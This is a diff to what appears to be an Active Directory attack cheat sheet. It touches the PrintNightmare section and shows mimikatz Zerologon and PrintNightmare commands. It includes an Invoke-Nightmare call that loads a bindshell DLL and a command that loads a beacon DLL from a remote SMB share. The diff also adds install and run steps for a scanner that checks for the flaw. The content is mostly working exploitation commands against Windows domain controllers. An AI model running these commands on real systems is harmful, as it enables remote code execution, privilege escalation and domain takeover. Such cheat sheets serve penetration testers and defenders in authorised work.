@@ -578,7 +578,7 @@ Exploit steps from the white paper
   lsadump::postzerologon /target:10.10.10.10 /account:DC01$
   ```
 
-#### CVE-2021-1675 PrintNightmare
+#### CVE-2021-1675 - CVE-2021-34527 - PrintNightmare
 
 The DLL will be stored in `C:\Windows\System32\spool\drivers\x64\3\`.
 The exploit will execute the DLL either from the local filesystem or a remote share.
@@ -613,7 +613,14 @@ Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
 ## LPE
 misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
 ## RCE
-misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50 
+misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
+
+# It Was All A Dream - https://github.com/byt3bl33d3r/ItWasAllADream
+# PrintNightmare scanner/checker (no exploit)
+## RCE only
+git clone https://github.com/byt3bl33d3r/ItWasAllADream
+cd ItWasAllADream && poetry install && poetry shell
+itwasalladream -u user -p password -d domain 192.168.1.0/24
 ```
 
 **NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109) .
